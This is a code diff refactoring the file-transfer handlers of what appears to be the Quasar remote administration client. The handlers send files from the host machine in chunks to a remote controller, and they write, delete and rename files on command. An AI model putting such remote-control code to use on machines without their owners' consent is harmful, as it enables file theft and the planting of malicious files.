@@ -91,79 +91,81 @@ namespace Quasar.Client.Commands
             }
         }
 
-        public static void HandleDoDownloadFile(DoDownloadFile command, Networking.Client client)
+        public static void HandleDoDownloadFile(FileTransferRequest command, Networking.Client client)
         {
             new Thread(() =>
             {
-                _limitThreads.WaitOne();
+                LimitThreads.WaitOne();
                 try
                 {
-                    FileSplit srcFile = new FileSplit(command.RemotePath);
-                    if (srcFile.MaxBlocks < 0)
-                        throw new Exception(srcFile.LastError);
-
-                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                    using (var srcFile = new FileSplit(command.RemotePath, FileAccess.Read))
                     {
-                        if (!client.Connected || _canceledDownloads.ContainsKey(command.Id))
-                            break;
-
-                        byte[] block;
-
-                        if (!srcFile.ReadBlock(currentBlock, out block))
-                            throw new Exception(srcFile.LastError);
-
-
-                        client.SendBlocking(new DoDownloadFileResponse
+                        foreach (var chunk in srcFile)
                         {
-                            Id = command.Id,
-                            Filename = Path.GetFileName(command.RemotePath),
-                            Block = block,
-                            MaxBlocks = srcFile.MaxBlocks,
-                            CurrentBlock = currentBlock,
-                            CustomMessage = srcFile.LastError
-                        });
+                            if (!client.Connected || CanceledFileTransfers.ContainsKey(command.Id))
+                                break;
+
+                            // blocking sending might not be required, needs further testing
+                            client.SendBlocking(new FileTransferChunk
+                            {
+                                Id = command.Id,
+                                FilePath = command.RemotePath,
+                                FileSize = srcFile.FileSize,
+                                Chunk = chunk
+                            });
+                        }
                     }
                 }
-                catch (Exception ex)
+                catch (Exception)
                 {
-                    client.SendBlocking(new DoDownloadFileResponse
+                    CanceledFileTransfers.Add(command.Id, "error");
+                    client.Send(new FileTransferCancel
                     {
                         Id = command.Id,
-                        Filename = Path.GetFileName(command.RemotePath),
-                        Block = new byte[0],
-                        MaxBlocks = -1,
-                        CurrentBlock = -1,
-                        CustomMessage = ex.Message
+                        Reason = "Error reading file"
                     });
                 }
-                _limitThreads.Release();
+                LimitThreads.Release();
             }).Start();
         }
 
-        public static void HandleDoDownloadFileCancel(DoDownloadFileCancel command, Networking.Client client)
+        public static void HandleDoDownloadFileCancel(FileTransferCancel command, Networking.Client client)
         {
-            if (!_canceledDownloads.ContainsKey(command.Id))
+            if (!CanceledFileTransfers.ContainsKey(command.Id))
             {
-                _canceledDownloads.Add(command.Id, "canceled");
-                client.SendBlocking(new DoDownloadFileResponse
+                CanceledFileTransfers.Add(command.Id, "canceled");
+                client.Send(new FileTransferCancel
                 {
                     Id = command.Id,
-                    Filename = "canceled",
-                    Block = new byte[0],
-                    MaxBlocks = -1,
-                    CurrentBlock = -1,
-                    CustomMessage = "Canceled"
+                    Reason = "Canceled"
                 });
             }
         }
 
-        public static void HandleDoUploadFile(DoUploadFile command, Networking.Client client)
+        public static void HandleDoUploadFile(FileTransferChunk command, Networking.Client client)
         {
-            if (command.CurrentBlock == 0 && System.IO.File.Exists(command.RemotePath))
-                NativeMethods.DeleteFile(command.RemotePath); // delete existing file
+            try
+            {
+                if (CanceledFileTransfers.ContainsKey(command.Id))
+                    return;
 
-            FileSplit destFile = new FileSplit(command.RemotePath);
-            destFile.AppendBlock(command.Block, command.CurrentBlock);
+                if (command.Chunk.Offset == 0 && File.Exists(command.FilePath))
+                    NativeMethods.DeleteFile(command.FilePath); // delete existing file
+
+                using (var destFile = new FileSplit(command.FilePath, FileAccess.Write))
+                {
+                    destFile.WriteChunk(command.Chunk);
+                }
+            }
+            catch (Exception)
+            {
+                CanceledFileTransfers.Add(command.Id, "error");
+                client.Send(new FileTransferCancel
+                {
+                    Id = command.Id,
+                    Reason = "Error writing file"
+                });
+            }
         }
 
         public static void HandleDoPathDelete(DoPathDelete command, Networking.Client client)
@@ -190,7 +192,7 @@ namespace Quasar.Client.Commands
                         });
                         break;
                     case FileType.File:
-                        System.IO.File.Delete(command.Path);
+                        File.Delete(command.Path);
                         client.Send(new SetStatusFileManager
                         {
                             Message = "Deleted file",
@@ -252,7 +254,7 @@ namespace Quasar.Client.Commands
                         });
                         break;
                     case FileType.File:
-                        System.IO.File.Move(command.Path, command.NewPath);
+                        File.Move(command.Path, command.NewPath);
                         client.Send(new SetStatusFileManager
                         {
                             Message = "Renamed file",
